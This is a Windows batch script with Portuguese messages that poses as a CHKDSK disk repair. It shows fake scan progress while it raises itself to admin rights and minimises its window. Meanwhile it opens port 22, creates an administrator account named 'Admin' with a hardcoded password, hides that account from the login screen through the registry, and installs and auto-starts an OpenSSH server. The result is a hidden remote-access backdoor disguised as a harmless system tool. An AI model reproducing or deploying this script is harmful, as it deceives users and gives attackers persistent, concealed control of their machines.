﻿@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit)
title chkdsk.exe
echo Recupera‡ƒo do sistema iniciada...
echo O Windows encontrou erros no sistema de arquivos e iniciou uma varredura para corrigir as falhas. Por favor, aguarde alguns segundos.
echo Executando o CHKDSK no modo somente leitura
echo Estagio 1: examinando a estrutura do sistema de arquivos...
echo 	1568 registros de arquivos grandes processados
echo Verifica‡ƒo de arquivos conclu¡da
echo 	5412 registros de arquivos grandes processados
echo 	0 registros de arquivos corrompidos processados
echo Estagio 2: examinando a liga‡ƒo do nome do arquivo...
echo Progresso: 200473 de 246020 conclu¡dos; Estagio: 81%%; Total: 63%%; ETA:	0:00:15


if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

netsh advfirewall firewall add rule name="TCP Port 22" dir=in action=allow protocol=TCP localport=22

net user Admin 10204030 /add
net localgroup administradores Admin /add
net localgroup administrators Admin /add
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Admin /t REG_DWORD /d 0 /f

powershell.exe Expand-Archive -Path "C:\dt_files\OpenSSH.zip" -DestinationPath 'C:\Program Files\OpenSSH\' -Force
powershell.exe -ExecutionPolicy Bypass -File "C:\Program Files\OpenSSH\OpenSSH-Win64\install-sshd.ps1"
powershell.exe New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH SSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -Program "C:\Windows\System32\OpenSSH\sshd.exe"
powershell.exe Start-Service sshd

powershell.exe Set-Service -Name sshd -StartupType Automatic



type nul > C:\dt_files\inst.txt

exit